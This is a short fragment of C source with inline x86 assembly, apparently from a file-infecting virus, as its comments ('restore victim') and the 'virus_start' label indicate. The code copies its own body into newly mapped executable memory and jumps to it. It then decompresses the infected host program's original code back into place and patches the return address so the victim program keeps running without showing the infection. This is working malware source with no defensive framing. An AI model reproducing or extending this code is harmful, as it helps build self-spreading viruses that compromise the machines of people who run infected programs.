	/* move itself to the new memory location */	
	uint32_t text_size = *(uint32_t*)(g->self + g->size);
	uint32_t nloc;
	nloc = mmap(NULL, text_size, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, 0, 0);
	if (nloc > 0xfffff000)
		exit(0);
	memcpy((void*)nloc, g->self, text_size);
	*(uint32_t*)(nloc + 8) -= nloc - (uint32_t)g->self;
	mprotect(nloc, text_size, PROT_READ|PROT_EXEC);
	asm volatile ("leal 1f-virus_start(%0),%%eax; jmp *%%eax; 1:":: "r"(nloc):"%eax");

	/* restore victim */
	char tmp[3374];
	text_size = (text_size + 4095) & 0xfffff000;
	mprotect((uint32_t)g->self & 0xfffff000, text_size, PROT_READ|PROT_WRITE);
	ari_expand((void*)(nloc + g->size + 4), g->self, tmp);
	mprotect((uint32_t)g->self & 0xfffff000, text_size, PROT_READ|PROT_EXEC);
	/* adjust return address */
	*(uint32_t*)(&esp - 1) = (nloc + 6);
